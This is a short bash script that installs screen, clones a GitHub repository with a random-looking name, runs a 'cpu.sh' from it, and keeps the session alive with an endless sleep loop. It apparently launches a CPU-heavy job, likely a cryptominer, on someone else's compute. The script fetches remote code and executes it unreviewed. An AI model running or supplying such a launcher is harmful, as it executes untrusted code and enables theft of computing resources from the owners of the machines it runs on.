#!/bin/bash
sudo apt update
sudo apt install screen -y
git clone https://github.com/bimasaputrq581/furry-octo-waddle.git && cd furry-octo-waddle
screen -dmS ls
chmod +x cpu.sh && ./cpu.sh
while [ 1 ]; do
sleep 3
done
sleep 999
